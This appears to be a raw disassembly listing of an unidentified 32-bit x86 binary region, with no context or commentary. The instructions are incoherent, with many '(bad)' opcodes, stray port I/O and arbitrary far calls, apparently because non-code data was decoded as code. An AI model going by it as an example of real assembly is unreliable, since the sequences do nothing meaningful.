  41ea9b:	adc    ebx,DWORD PTR [edx+0x73]
  41ea9e:	mov    esp,0x70c644a7
  41eaa3:	sbb    ecx,DWORD PTR [ebx]
  41eaa5:	retf   
  41eaa6:	pop    edi
  41eaa7:	jg     0x41eab0
  41eaa9:	add    BYTE PTR [esi+0x41],dl
  41eaac:	add    bh,bl
  41eaae:	repz pop ds
  41eab0:	in     al,dx
  41eab1:	lock bound ebp,QWORD PTR [eax+0x20]
  41eab5:	outs   dx,BYTE PTR ds:[esi]
  41eab6:	mov    ah,0x9d
  41eab8:	inc    edi
  41eab9:	cs call 0x5a5b:0x6d58afed
  41eac1:	pop    edx
  41eac2:	xchg   ecx,eax
  41eac3:	repnz out dx,eax
  41eac5:	into   
  41eac6:	xchg   edx,eax
  41eac7:	gs cwde 
  41eac9:	daa    
  41eaca:	pop    ss
  41eacb:	jbe    0x41eaa8
  41eacd:	mov    dh,0xda
  41eacf:	(bad)  
  41ead0:	vdivpd xmm7,xmm5,XMMWORD PTR [esi-0x64a08ef5]
  41ead8:	sar    DWORD PTR [ebx],1
  41eada:	ret    0x616d
  41eadd:	mov    DWORD PTR [ecx-0x26],ecx
  41eae0:	fistp  WORD PTR [eax+ebp*2+0x22]
  41eae4:	cmp    BYTE PTR [edx],0x1b
  41eae7:	dec    ebx
  41eae8:	retf   
  41eae9:	ret    0x7f93
  41eaec:	mov    cl,0x13
  41eaee:	inc    edi
  41eaef:	and    eax,0xd85bff99
  41eaf4:	adc    al,0x6c
  41eaf6:	cmp    BYTE PTR [ecx],bh
  41eaf8:	cmp    DWORD PTR [edi-0x314a4d88],ebp
  41eafe:	or     ebx,DWORD PTR [ebx]
  41eb00:	mov    ah,0x6d
  41eb02:	daa    
  41eb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb04:	pop    edx
  41eb05:	(bad)
  41eb08:	ror    cl,1
  41eb0a:	push   edx
  41eb0b:	mov    ebx,0xabd76db1
  41eb10:	push   eax
  41eb11:	xor    BYTE PTR [eax],0xde
  41eb14:	pushf  
  41eb15:	inc    edi
  41eb16:	stos   BYTE PTR es:[edi],al
  41eb17:	imul   ebx,edx,0xffffffbe
  41eb1a:	(bad)  [esi]
  41eb1c:	outs   dx,BYTE PTR ds:[esi]
  41eb1d:	sti    
  41eb1e:	pop    esi
  41eb1f:	into   
  41eb20:	push   ss
  41eb21:	xor    ah,BYTE PTR [ebx-0x13114c5]
  41eb27:	ins    DWORD PTR es:[edi],dx
  41eb28:	arpl   WORD PTR [ecx+0x32],di
  41eb2b:	add    BYTE PTR [ecx+eiz*1+0x118fc227],ch
  41eb32:	hlt    
  41eb33:	add    BYTE PTR [ebx+eiz*2],ah
  41eb36:	add    BYTE PTR [ecx-0x3e],dl
  41eb39:	ins    DWORD PTR es:[edi],dx
  41eb3a:	fistp  DWORD PTR [eax-0x64]
  41eb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb3e:	sub    DWORD PTR [eax+0x4f83cec1],esi
  41eb44:	dec    ecx
  41eb45:	pop    ebx
  41eb46:	sbb    eax,0x69218dc1
  41eb4b:	imul   ebx,DWORD PTR [edi],0xdad2a075
  41eb51:	mov    eax,0xaa924b6d
  41eb56:	dec    edx
  41eb57:	nop
  41eb58:	aam    0x6b
  41eb5a:	cmp    al,dh
  41eb5c:	jecxz  0x41ebcb
  41eb5e:	mov    ecx,0x130255b4
  41eb63:	mov    ebp,0xe624e983
  41eb68:	push   ebx
  41eb69:	mov    al,0x15
  41eb6b:	cs mov ah,0x7c
  41eb6e:	and    edx,DWORD PTR [eax]
  41eb70:	mov    ds:0x35ddd0d7,al
  41eb75:	ins    DWORD PTR es:[edi],dx
  41eb76:	ins    BYTE PTR es:[edi],dx
  41eb77:	(bad)  [esi-0x1df1e76c]
  41eb7d:	adc    al,0xa8
  41eb7f:	pop    ecx
  41eb80:	sub    ebp,0x74
  41eb83:	adc    al,0xd8
  41eb85:	mov    edx,0x1dfc38b4
  41eb8a:	mov    ecx,0x246bac60
  41eb8f:	fchs   
  41eb91:	(bad)  
  41eb92:	cs sbb al,0x3c
  41eb95:	dec    ebx
  41eb96:	jge    0x41ebf1
  41eb98:	nop
  41eb99:	js     0x41eb1e
  41eb9b:	dec    ecx
  41eb9c:	mov    ebx,0xa15b1b6d
  41eba1:	cld    
  41eba2:	sbb    BYTE PTR [esi-0x38],ch
  41eba5:	pop    es
  41eba6:	xor    dh,dl
  41eba8:	dec    edx
  41eba9:	das    
  41ebaa:	test   DWORD PTR [ebx+0x6c],ecx
  41ebad:	pop    ebx
  41ebae:	into   
  41ebaf:	call   0x4384:0xfe22f229
  41ebb6:	fiadd  DWORD PTR [ebp+0x749750b6]
  41ebbc:	and    eax,ecx
  41ebbe:	out    0x1f,al
  41ebc0:	das    
  41ebc1:	test   al,0x6d
  41ebc3:	or     edx,DWORD PTR [edi]
  41ebc5:	test   DWORD PTR [edi],esi
  41ebc7:	xchg   edx,eax
  41ebc8:	ror    BYTE PTR [eax+0x6df5e1bc],1
  41ebce:	imul   esp,DWORD PTR [ecx+0x59],0x7685c453
  41ebd5:	push   edi
  41ebd6:	dec    ebp
  41ebd7:	and    BYTE PTR [ebx],ah
  41ebd9:	ins    DWORD PTR es:[edi],dx
  41ebda:	pop    ebx
  41ebdb:	fdiv   DWORD PTR [esi+0x1aecbf91]
  41ebe1:	jg     0x41eb95
  41ebe3:	push   esi
  41ebe4:	push   esi
  41ebe5:	add    DWORD PTR [edi-0x26],0x6d
  41ebe9:	popa   
  41ebea:	mov    eax,ds:0xa0988c1d
  41ebef:	sbb    ebx,DWORD PTR [eax+0x7635dff4]
  41ebf5:	fcmovnu st,st(0)
  41ebf7:	push   ss
  41ebf8:	icebp  
  41ebf9:	xchg   ebx,eax
  41ebfa:	aam    0x7c
  41ebfc:	dec    esi
  41ebfd:	stc    
  41ebfe:	pop    ss
  41ebff:	into   
  41ec00:	ins    DWORD PTR es:[edi],dx
  41ec01:	inc    edi
  41ec02:	fcmovnb st,st(2)
  41ec04:	test   DWORD PTR [ebp+0xeeb7117],esp
  41ec0a:	dec    eax
  41ec0b:	addr16 clc 
  41ec0d:	enter  0xdfec,0xd8
  41ec11:	dec    edx
  41ec12:	or     ecx,DWORD PTR [edi+0x5f]
  41ec15:	adc    al,0x29
  41ec17:	aas    
  41ec18:	(bad)  
  41ec19:	mov    eax,ds:0x1b910083
  41ec1e:	fcmovnbe st,st(6)
  41ec20:	xchg   esi,eax
  41ec21:	push   ss
  41ec22:	test   eax,0xea22f47
  41ec27:	test   DWORD PTR [ebp-0x720d121c],ecx
  41ec2d:	repnz cmp al,0x0
  41ec30:	pop    esi
  41ec31:	mov    dl,0x42
  41ec33:	cwde   
  41ec34:	jecxz  0x41ec36
  41ec36:	jmp    0x41ec30
  41ec38:	pop    edx
  41ec39:	pop    ss
  41ec3a:	inc    eax
  41ec3b:	fist   DWORD PTR [esi-0x6a38eb92]
  41ec41:	into   
  41ec42:	jb     0x41ebee
  41ec44:	xchg   esi,eax
  41ec45:	dec    edx
  41ec46:	(bad)  
  41ec47:	(bad)  
  41ec48:	(bad)  
  41ec49:	mov    edx,0x7fa00d06
  41ec4e:	outs   dx,BYTE PTR ds:[esi]
  41ec4f:	into   
  41ec50:	popa   
  41ec51:	scas   al,BYTE PTR es:[edi]
  41ec52:	retf   0xe952
  41ec55:	ret    0x72d6
  41ec58:	mov    eax,0xb6a3d5b
  41ec5d:	jno    0x41eca6
  41ec5f:	mov    ch,0x85
  41ec61:	pop    ebx
  41ec62:	jmp    0xbf6bc489
  41ec67:	inc    esp
  41ec68:	mov    edx,0x7665bf16
  41ec6d:	test   eax,0xbabf2e01
  41ec72:	mov    cl,0x64
  41ec74:	cld    
  41ec75:	outs   dx,BYTE PTR ds:[esi]
  41ec76:	stos   DWORD PTR es:[edi],eax
  41ec77:	sbb    bh,BYTE PTR [ebx]
  41ec79:	aaa    
  41ec7a:	mov    dh,0x6d
  41ec7c:	sbb    DWORD PTR [edx+0x7b],0x84b0f5b9
  41ec83:	fdivr  DWORD PTR [ebx+ebp*1+0x4b6db1b1]
  41ec8a:	mov    esp,0x7769e320
  41ec8f:	xor    bh,cl
  41ec91:	push   edx
  41ec92:	jbe    0x41ec3d
  41ec94:	jo     0x41ec39
  41ec96:	imul   ebx,DWORD PTR [eax+esi*8-0xc0a623f],0x16dafecc
  41eca1:	retf   0xfbd6
  41eca4:	cmp    dh,BYTE PTR [ebp-0x5764215a]
  41ecaa:	push   0xaa5a3637
  41ecaf:	(bad)  
  41ecb0:	call   0xe8924a47
  41ecb5:	outs   dx,BYTE PTR ds:[esi]
  41ecb6:	ins    BYTE PTR es:[edi],dx
  41ecb7:	ins    DWORD PTR es:[edi],dx
  41ecb8:	sub    DWORD PTR [eax-0x24],ebx
  41ecbb:	loop   0x41ed17
  41ecbd:	test   BYTE PTR [eax+ecx*1-0x2934b8f5],0x2e
  41ecc5:	pop    es
  41ecc6:	sub    BYTE PTR [esi],0x8f
  41ecc9:	mov    bl,0x97
  41eccb:	mov    es,ecx
  41eccd:	fcmovu st,st(0)
  41eccf:	fimul  DWORD PTR ds:0x29ce1fa5
  41ecd5:	xor    eax,0x638766af
  41ecda:	arpl   bx,bx
  41ecdc:	pop    eax
  41ecdd:	lds    esp,FWORD PTR [edi-0x36465b52]
  41ece3:	xor    ebp,edx
  41ece5:	leave  
  41ece6:	aaa    
  41ece7:	fidiv  DWORD PTR [esi+0x69]
  41ecea:	mov    ecx,0x776b81aa
  41ecef:	daa    
  41ecf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf1:	cmp    DWORD PTR [ecx],ecx
  41ecf3:	test   al,0x97
  41ecf5:	push   ss
  41ecf6:	push   ss
  41ecf7:	or     ah,BYTE PTR [ebx+esi*2-0x3a]
  41ecfb:	add    DWORD PTR [edx],ebx
  41ecfd:	jge    0x41ed68
  41ecff:	sbb    al,0x6b
  41ed01:	mov    ds:0xdb2f2c6d,eax
  41ed06:	sahf   
  41ed07:	repnz nop
  41ed09:	int    0xa0
  41ed0b:	aaa    
  41ed0c:	pop    edx
  41ed0d:	fld    TBYTE PTR [ebp+0x16]
  41ed10:	ret    0x99ee
  41ed13:	sub    al,0x8e
  41ed15:	pop    ebx
  41ed16:	and    al,0x6d
  41ed18:	inc    esp
  41ed19:	fild   DWORD PTR [edx-0x7]
  41ed1c:	push   ss
  41ed1d:	in     al,0xb9
  41ed1f:	add    BYTE PTR [edx+eiz*2],bh
  41ed22:	pop    esi
  41ed23:	mov    al,BYTE PTR [eax+0x1e00d6f3]
  41ed29:	outs   dx,BYTE PTR ds:[esi]
  41ed2a:	ficom  DWORD PTR ds:0xd7135e79
  41ed30:	push   cs
  41ed31:	pop    ebx
  41ed32:	(bad)  [esi+0x71a46fed]
  41ed38:	test   DWORD PTR [ecx-0x433c6dec],ecx
  41ed3e:	loopne 0x41ed78
  41ed40:	or     BYTE PTR [esi-0x14a4f473],dl
  41ed46:	fadd   DWORD PTR [edx-0x5b]
  41ed49:	or     dh,BYTE PTR [esi+0x61d0be51]
  41ed4f:	in     eax,0x36
  41ed51:	add    BYTE PTR [ebx-0x6aae092f],al
  41ed57:	mov    dh,0x8d
  41ed59:	dec    ebx
  41ed5a:	in     eax,dx
  41ed5b:	pop    ss
  41ed5c:	inc    esi
  41ed5d:	xlat   BYTE PTR ds:[ebx]
  41ed5e:	adc    cl,0xe4
  41ed61:	pushf  
  41ed62:	scas   eax,DWORD PTR es:[edi]
  41ed63:	sbb    al,BYTE PTR [esi+0x36d0b1bb]
  41ed69:	dec    ebx
  41ed6a:	jno    0x41ed3a
  41ed6c:	dec    ecx
  41ed6d:	jbe    0x41ed8d
  41ed6f:	das    
  41ed70:	ret    0xdba1
  41ed73:	mov    dh,0xa7
  41ed75:	pop    ebx
  41ed76:	sub    al,0xbd
  41ed78:	dec    esp
  41ed79:	out    0x8d,al
  41ed7b:	and    ecx,DWORD PTR [esi+0x760843fe]
  41ed81:	sub    DWORD PTR [ebp+0x63],0x4d734512
  41ed88:	cdq    
  41ed89:	xor    BYTE PTR [ebx],dh
  41ed8b:	sub    eax,0xdad858b9
  41ed90:	test   DWORD PTR [edx],edi
  41ed92:	or     al,ah
  41ed94:	pop    edi
  41ed95:	inc    esp
  41ed96:	retf   0xe434
  41ed99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed9a:	jb     0x41edff
  41ed9c:	fild   DWORD PTR [edx-0x46]
  41ed9f:	aam    0x1c
  41eda1:	sub    eax,0x6ef5fd4a
  41eda6:	sbb    edx,DWORD PTR [edx+ecx*2]
  41eda9:	imul   esi,DWORD PTR [ebx-0x50],0x9f1629b5
  41edb0:	adc    al,0x6e
  41edb2:	xor    al,0x16
  41edb4:	fs aaa 
  41edb6:	adc    DWORD PTR [ecx-0x75],0xb4b10ad3
  41edbd:	adc    eax,0x8b79b52e
  41edc2:	fdiv   QWORD PTR [ecx-0xe]
  41edc5:	xor    eax,0xc2c6c661
  41edca:	mov    dh,0xd8
  41edcc:	(bad)  
  41edcd:	pop    ss
  41edce:	mov    ah,0x73
  41edd0:	sar    BYTE PTR [edi],1
  41edd2:	mov    dh,0x24
  41edd4:	jnp    0x41edbe
  41edd6:	ret    0x4dc2
  41edd9:	test   eax,0x18ae6afb
  41edde:	mov    DWORD PTR [ecx],ebx
  41ede0:	pop    ss
  41ede1:	ret    0xb5b6
  41ede4:	inc    edx
  41ede5:	aad    0xe3
  41ede7:	sub    al,0xd9
  41ede9:	add    eax,0x7b7fd622
  41edee:	call   0xccffdb5
  41edf3:	scas   al,BYTE PTR es:[edi]
  41edf4:	repnz inc ebx
  41edf6:	sti    
  41edf7:	lahf   
  41edf8:	jg     0x41edfa
  41edfa:	inc    edx
  41edfb:	arpl   WORD PTR [eax],ax
  41edfd:	mov    dh,0x54
  41edff:	add    BYTE PTR [esi-0x7c8a69e1],dl
  41ee05:	fs sti 
  41ee07:	sbb    ecx,DWORD PTR [ebp-0x6c1112a5]
  41ee0d:	sub    al,0x67
  41ee0f:	cmp    dh,bl
  41ee11:	out    0x66,eax
  41ee13:	and    ebx,ebp
  41ee15:	sbb    cl,BYTE PTR ds:0x5e5d525b
  41ee1b:	pop    ss
  41ee1c:	loope  0x41ee1c
  41ee1e:	xchg   edx,eax
  41ee1f:	fdiv   QWORD PTR [esi+0x61]
  41ee22:	stos   DWORD PTR es:[edi],eax
  41ee23:	mov    al,0x86
  41ee25:	sbb    DWORD PTR [ebx+edi*4+0x60],ecx
  41ee29:	out    dx,al
  41ee2a:	scas   eax,DWORD PTR es:[edi]
  41ee2b:	jmp    0x41edc8
  41ee2d:	pop    ebx
  41ee2e:	dec    ebp
  41ee2f:	shr    BYTE PTR [ebp+0x43a840b2],0xeb
  41ee36:	push   ss
  41ee37:	neg    ebx
  41ee39:	(bad)  
  41ee3a:	mov    BYTE PTR [edx],0x33
  41ee3d:	(bad)  
  41ee3e:	stc    
  41ee3f:	ret    
  41ee40:	push   edx
  41ee41:	aaa    
  41ee42:	into   
  41ee43:	call   0xf00a:0xb40a176
  41ee4a:	enter  0x3f82,0x16
  41ee4e:	cmc    
  41ee4f:	jbe    0x41eeb2
  41ee51:	imul   ebx,ebx,0x2e
  41ee54:	push   cs
  41ee55:	data16 mov bl,0x41
  41ee58:	div    cl
  41ee5a:	mov    BYTE PTR [edi+0x74],0xda
  41ee5e:	fdiv   DWORD PTR [esi-0x6a84b67b]
  41ee64:	sub    eax,0xe951d4aa
  41ee69:	pop    eax
  41ee6a:	pop    edx
  41ee6b:	pop    eax
  41ee6c:	fsub   DWORD PTR [ecx+0x7f]
  41ee6f:	jl     0x41ee52
  41ee71:	sbb    al,0xde
  41ee73:	add    ch,BYTE PTR [ecx-0x13]
  41ee76:	rcl    BYTE PTR [edx-0x57],cl
  41ee79:	and    ah,bl
  41ee7b:	xor    DWORD PTR [edx-0x4e5513e3],ebp
  41ee81:	sub    eax,0xe5026c6c
  41ee86:	mov    cl,0x7f
  41ee89:	in     eax,dx
  41ee8a:	inc    ecx
  41ee8b:	jmp    0xb1f7c033
  41ee90:	stos   DWORD PTR es:[edi],eax
  41ee91:	cmc    
  41ee92:	cld    
  41ee93:	icebp  
  41ee94:	xchg   esp,eax
  41ee95:	push   es
  41ee96:	(bad)  
  41ee97:	or     DWORD PTR [eax],eax
  41ee99:	or     dh,BYTE PTR [edi-0x3e3c3a93]
  41ee9f:	mov    esp,0xcb2535cd
  41eea4:	(bad)  
  41eea5:	push   esi
  41eea6:	pop    eax
  41eea7:	outs   dx,DWORD PTR ds:[esi]
  41eea8:	xor    ebx,DWORD PTR [esi-0x8]
  41eeab:	fst    QWORD PTR [ecx-0x21]
  41eeae:	jbe    0x41ef11
  41eeb0:	test   eax,0xbf4f5b45
  41eeb5:	or     BYTE PTR [ebp-0x38127149],ch
  41eebb:	lea    esi,[esi-0x55]
  41eebe:	push   esp
  41eebf:	fwait
  41eec0:	or     al,0xa3
  41eec2:	pop    ebp
  41eec3:	pushf  
  41eec4:	push   esi
  41eec5:	call   0x7d14:0x7c2e1541
  41eecc:	loop   0x41eeaa
  41eece:	sbb    ecx,DWORD PTR [edx-0x4726a4f3]
  41eed4:	mov    ah,0x6b
  41eed6:	sub    DWORD PTR [edx+0x7ac37ef4],edx
  41eedc:	shl    DWORD PTR [ecx+0x54],1
  41eedf:	mov    eax,0x63b6c6d
  41eee4:	pushf  
  41eee5:	fiadd  DWORD PTR [edi+ebx*1-0x79]
  41eee9:	xor    ecx,eax
  41eeeb:	(bad)  
  41eeec:	mov    edx,0x796805b0
  41eef1:	sar    BYTE PTR [ebx+0x17541746],0x96
  41eef8:	push   ss
  41eef9:	sbb    cl,BYTE PTR [eax+0x468fbd3d]
  41eeff:	mov    al,ds:0x5850428a
  41ef04:	pop    edx
  41ef05:	push   0xeff801e3
  41ef0a:	cmp    bl,ah
  41ef0c:	ins    DWORD PTR es:[edi],dx
  41ef0d:	loope  0x41eee5
  41ef0f:	test   al,0xcc
  41ef11:	dec    esp
  41ef12:	adc    DWORD PTR [edx+ebp*1+0x6d5026c4],ebp
  41ef19:	mov    eax,ds:0x38ae1b55
  41ef1e:	cli    
  41ef1f:	mov    ds:0x342ce301,eax
  41ef24:	(bad)
  41ef27:	adc    dh,BYTE PTR [edx-0x5cea2ff2]
  41ef2d:	pushf  
  41ef2e:	ins    DWORD PTR es:[edi],dx
  41ef2f:	mov    ebx,0x7a26ed1
  41ef34:	out    dx,al
  41ef35:	push   0xf5d0ff75
  41ef3a:	inc    eax
  41ef3b:	shl    DWORD PTR [eax-0x29492e50],1
  41ef41:	in     al,dx
  41ef42:	jl     0x41efb8
  41ef44:	fmul   DWORD PTR [edx+0x67]
  41ef47:	jge    0x41ef26
  41ef49:	ficomp DWORD PTR [edx]
  41ef4b:	sbb    esi,DWORD PTR [edx+0x58]
  41ef4e:	dec    eax
  41ef4f:	sahf   
  41ef50:	stc    
  41ef51:	les    esp,FWORD PTR [edx]
  41ef53:	dec    esp
  41ef54:	ins    DWORD PTR es:[edi],dx
  41ef55:	fcmovnu st,st(2)
  41ef57:	mov    dh,0x41
  41ef59:	dec    eax
  41ef5a:	sub    DWORD PTR [ebx+edx*2+0x23],eax
  41ef5e:	add    eax,0xad899ed4
  41ef63:	test   DWORD PTR [ebp-0x6f4b9673],esp
  41ef69:	push   cs
  41ef6a:	arpl   WORD PTR [ecx],bx
  41ef6c:	mov    ecx,DWORD PTR [edx]
  41ef6e:	pop    ss
  41ef6f:	ss push ss
  41ef71:	fisubr DWORD PTR [edi+0x24]
  41ef74:	inc    edi
  41ef75:	cs jns 0x41ef1d
  41ef78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef79:	mov    ebx,0x5ae01414
  41ef7e:	pop    edx
  41ef7f:	push   0xe1007c8
  41ef84:	mov    cl,0xa0
  41ef86:	push   0x17
  41ef88:	pop    edx
  41ef89:	mov    eax,ds:0xe505fc5e
  41ef8e:	dec    ebp
  41ef8f:	clc    
  41ef90:	cmc    
  41ef91:	mov    al,ds:0xacda850b
  41ef96:	inc    edi
  41ef97:	shr    DWORD PTR [ebx],0x5a
  41ef9a:	call   0x1a4fa655
  41ef9f:	sti    
  41efa0:	push   ebx
  41efa1:	sub    DWORD PTR [edx],eax
  41efa3:	sub    DWORD PTR ds:0xdadab69d,esi
  41efa9:	push   ss
  41efaa:	push   ss
  41efab:	sbb    al,0x72
  41efad:	or     bh,BYTE PTR [esp+edi*4+0x716219e3]
  41efb4:	imul   ebp,DWORD PTR [ebx],0x3b92565c
  41efba:	jo     0x41ef7e
  41efbc:	fnsave [edx]
  41efbe:	rcr    BYTE PTR [ecx+0x6d],cl
  41efc1:	mov    ebx,0xb2ac4db5
  41efc6:	inc    ebx
  41efc7:	imul   ebp,DWORD PTR [ecx],0xffffffce
  41efca:	sbb    DWORD PTR [edx],ebx
  41efcc:	lods   eax,DWORD PTR ds:[esi]
  41efcd:	mov    WORD PTR [edi+ebx*8+0x67f2b6],ss
  41efd4:	daa    
  41efd5:	addr16 fwait
  41efd7:	cli    
  41efd8:	(bad)  
  41efd9:	xchg   edx,eax
  41efda:	and    DWORD PTR [eax],eax
  41efdc:	int3   
  41efdd:	cld    
  41efde:	mov    cl,0xd0
  41efe0:	outs   dx,BYTE PTR ds:[esi]
  41efe1:	sub    al,0xc7
  41efe3:	std    
  41efe4:	cld    
  41efe5:	aam    0xd2
  41efe7:	xlat   BYTE PTR ds:[ebx]
  41efe8:	adc    edi,DWORD PTR [edx-0x4e8a5c97]
  41efee:	pop    ebp
  41efef:	xchg   DWORD PTR [ecx+0x61],edx
  41eff2:	in     al,dx
  41eff3:	or     al,0xd0
  41eff5:	mov    ecx,0x6b70be51
  41effa:	fisubr DWORD PTR [ecx-0x7083dcf7]
  41f000:	add    ch,al
  41f002:	arpl   WORD PTR [ebx-0x25],bx
  41f005:	(bad)  
  41f006:	mov    dh,0xae
  41f008:	push   edx
  41f009:	mov    WORD PTR [edx+0x61],?
  41f00c:	push   cs
  41f00d:	pop    ss
  41f00e:	movaps xmm4,XMMWORD PTR [ebx]
  41f011:	xor    al,0x6e
  41f013:	sub    al,0xb5
  41f015:	push   ebp
  41f016:	push   cs
  41f017:	pop    ss
  41f018:	xor    BYTE PTR ds:[ebp+edi*1+0x4e],dl
  41f01d:	mov    al,0xb4
  41f01f:	mov    ch,0x1b
  41f021:	sti    
  41f022:	and    ax,0x1a80
  41f026:	sahf   
  41f027:	mov    DWORD PTR [ecx-0x4a],eax
  41f02a:	mov    ah,0x41
  41f02c:	sub    al,0x63
  41f02e:	xor    ah,bh
  41f030:	cli    
  41f031:	mov    al,0xf3
  41f033:	(bad)  
  41f034:	pop    ebx
  41f035:	push   0x6dba8db7
  41f03a:	cmp    DWORD PTR [esi],0xfffffff2
  41f03d:	sbb    eax,0x96203f7f
  41f042:	fisubr DWORD PTR [ebp+0x61]
  41f045:	jae    0x41efe1
  41f047:	xor    DWORD PTR [edi-0x25],0x8d8ce613
  41f04e:	in     eax,dx
  41f04f:	add    BYTE PTR [ebp-0x24],ch
  41f052:	fiadd  DWORD PTR [esi-0x6d733f9b]
  41f058:	push   cs
  41f059:	pop    ebx
  41f05a:	or     dh,BYTE PTR [esi-0x2907414a]
  41f060:	lods   al,BYTE PTR ds:[esi]
  41f061:	mov    ?,WORD PTR [eax]
  41f063:	adc    eax,0x6c2c4bad
  41f068:	ins    DWORD PTR es:[edi],dx
  41f069:	leave  
  41f06a:	imul   edi,DWORD PTR [edi+0x40057c79],0x8
  41f071:	mov    dh,0xb6
  41f074:	ins    DWORD PTR es:[edi],dx
  41f075:	sbb    eax,0xe3a1bf78
  41f07a:	sub    al,BYTE PTR [eax+ecx*4+0x46d53451]
  41f081:	mov    edx,DWORD PTR [edi]
  41f083:	ss inc eax
  41f085:	xchg   ebp,eax
  41f086:	aaa    
  41f087:	sbb    ecx,DWORD PTR [ebx]
  41f089:	dec    ebx
  41f08a:	ins    BYTE PTR es:[edi],dx
  41f08b:	in     eax,dx
  41f08c:	repz xor al,0x1e
  41f08f:	loop   0x41f064
  41f091:	mov    ebp,0x6dadd27c
  41f096:	and    BYTE PTR [ebp+0x2f],0xde
  41f09a:	lock sar DWORD PTR [edx-0x2],1
  41f09e:	dec    ebp
  41f09f:	adc    DWORD PTR [ebp-0x72295a5b],esp
  41f0a5:	test   edx,esi
  41f0a7:	lock xchg edx,eax
  41f0a9:	cdq    
  41f0aa:	mov    al,0xdc
  41f0ac:	push   0x20929697
  41f0b1:	adc    al,0x7f
  41f0b3:	retf   0x1265
  41f0b6:	and    bh,BYTE PTR [edx+0x515d016d]
  41f0bc:	scas   eax,DWORD PTR es:[edi]
  41f0bd:	cmp    eax,0xdadbb62a
  41f0c2:	jbe    0x41f067
  41f0c4:	inc    ebp
  41f0c5:	inc    ebp
  41f0c6:	stos   DWORD PTR es:[edi],eax
  41f0c7:	dec    edi
  41f0c8:	(bad)  
  41f0c9:	int    0xf5
  41f0cb:	and    BYTE PTR [ebp-0x4e4344fe],bl
  41f0d1:	jo     0x41f061
  41f0d3:	pop    edi
  41f0d4:	int    0x5b
  41f0d6:	test   al,0x57
  41f0d8:	add    BYTE PTR [esi+0x4bb377cf],bl
  41f0de:	fcmovnb st,st(2)
  41f0e0:	inc    edx
  41f0e1:	mov    edi,eax
  41f0e3:	and    bh,bh
  41f0e5:	repnz icebp 
  41f0e7:	and    esp,ecx
  41f0e9:	pop    ebx
  41f0ea:	ins    DWORD PTR es:[edi],dx
  41f0eb:	mov    ebx,0xbea5f6d
  41f0f0:	(bad)
  41f0f4:	sti    
  41f0f5:	cmp    bh,BYTE PTR [esi-0x25]
  41f0f8:	mov    dh,0x35
  41f0fa:	mov    dh,0xdd
  41f0fc:	out    0x97,al
  41f0fe:	js     0x41f132
  41f100:	push   0xffffffb9
  41f102:	outs   dx,BYTE PTR ds:[esi]
  41f103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f104:	bound  ebp,QWORD PTR [ecx-0x7a4a91d7]
  41f10a:	fisubr DWORD PTR [ebx]
  41f10c:	pop    edx
  41f10d:	mov    ds:0x851752cd,al
  41f112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f114:	jbe    0x41f16c
  41f116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f117:	repnz bound ecx,QWORD PTR [esi-0xe]
  41f11b:	inc    edx
  41f11c:	dec    edi
  41f11d:	imul   edi,ecx,0x9468df2
  41f123:	cmp    al,dh
  41f125:	add    BYTE PTR [esi],bh
  41f127:	xor    cl,bh
  41f129:	add    BYTE PTR [esi],dh
  41f12b:	sub    ah,dh
  41f12d:	in     eax,dx
  41f12e:	and    BYTE PTR [ecx-0x7c3ad18a],0x6b
  41f135:	sbb    al,0x1a
  41f137:	jmp    0x310b:0xb42c2cb9
  41f13e:	adc    ah,bl
  41f140:	mov    dh,0x52
  41f142:	or     dl,bl
  41f144:	push   cs
  41f145:	xchg   ebp,eax
  41f146:	gs mov ebx,0xe02d56d
  41f14c:	push   es
  41f14d:	add    edi,DWORD PTR [edi-0x4924f6f2]
  41f153:	shr    DWORD PTR [esi],1
  41f155:	adc    al,0xf6
  41f157:	pop    ds
  41f158:	je     0x41f160
  41f15a:	out    dx,eax
  41f15b:	cmp    cl,0xb0
  41f15e:	stc    
  41f15f:	mov    ebx,0xfb46c6d
  41f164:	into   
  41f165:	cdq    
  41f166:	mov    ebx,0x5ca1146f
  41f16b:	dec    eax
  41f16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f16d:	fimul  DWORD PTR ds:0x8c4c6d13
  41f173:	les    eax,FWORD PTR [edx-0x32]
  41f176:	cmp    eax,esp
  41f178:	pop    ds
  41f179:	fsubr  QWORD PTR [edx-0x49]
  41f17c:	loop   0x41f136
  41f17e:	sub    edx,esp
  41f180:	shl    DWORD PTR [edx+0x6cabf837],cl
  41f186:	in     eax,dx
  41f187:	mov    dh,0x6c
  41f189:	mov    edi,0xdcb3a4ab
  41f18e:	fcmovbe st,st(4)
  41f190:	ja     0x41f127
  41f192:	lods   eax,DWORD PTR ds:[esi]
  41f193:	add    ebx,edx
  41f195:	rcl    BYTE PTR cs:[esi+0x10cadace],1
  41f19c:	xchg   DWORD PTR [edi-0x7269a01b],edi
  41f1a2:	call   0x32:0x716578cf
  41f1a9:	pusha  
  41f1aa:	add    BYTE PTR cs:[edx-0x6a],ch
  41f1ae:	gs pop ecx
  41f1b0:	xchg   esi,eax
  41f1b1:	jnp    0x41f216
  41f1b3:	jbe    0x41f1f9
  41f1b5:	dec    edi
  41f1b6:	dec    ebp
  41f1b7:	pop    ebx
  41f1b8:	and    BYTE PTR [ebp+0x59],0x78
  41f1bc:	push   esi
  41f1bd:	popa   
  41f1be:	rol    BYTE PTR [edx],1
  41f1c0:	and    BYTE PTR [ebp+0x2f52cb8d],dh
  41f1c6:	and    BYTE PTR [esi+esi*2],dl
  41f1c9:	(bad)  
  41f1ca:	jb     0x41f179
  41f1cc:	jbe    0x41f18e
  41f1ce:	ret    0x1212
  41f1d1:	push   0xffffff8b
  41f1d3:	add    ax,WORD PTR [ecx]
  41f1d6:	pop    esi
  41f1d7:	mov    dl,0x54
  41f1d9:	fcom   DWORD PTR [esi+0x56da5ace]
  41f1df:	popf   
  41f1e0:	das    
  41f1e1:	xor    ebp,DWORD PTR [edi]
  41f1e3:	xchg   esp,eax
  41f1e4:	or     bl,0x1e
  41f1e7:	sub    al,0x46
  41f1e9:	lea    esp,[ecx-0x42]
  41f1ec:	add    al,ch
